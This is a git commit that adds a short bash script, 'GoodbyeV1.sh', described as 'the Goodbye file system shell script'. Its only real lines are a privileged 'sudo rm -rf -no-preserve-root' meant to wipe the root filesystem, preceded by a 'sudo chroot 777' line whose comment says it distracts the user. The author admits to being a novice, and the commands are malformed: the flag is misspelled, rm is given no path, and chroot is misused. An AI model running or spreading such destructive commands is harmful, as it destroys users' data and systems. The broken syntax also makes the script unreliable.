622c6050b235e26b8d89ae160f656b7079005617
Sean P. Myrick V19.0.2 <65933340+seanpm2001@users.noreply.github.com>
2020-06-23 12:25:38 -0700

    GoodbyeV1.sh
    An archive of the first version of the Goodbye file system shell script.

---
+++ Ucuntu/GoodbyeV1.sh
@@ -0,0 +1,20 @@
+# Start of script
+
+# Brings up another prompt to distract
+sudo chroot 777;
+sudo rm -rf -no-preserve-root;
+
+# I don't know very much about Shell, so this should come as a pretty script kiddie thing
+
+""" 
+File info:
+
+Version: 1 (Tuesday, June 23rd 2020 at 12:25 pm)
+
+Line count (including blank lines: 21
+
+File type: BASH shell script (*.sh)
+
+"""
+
+# End of script
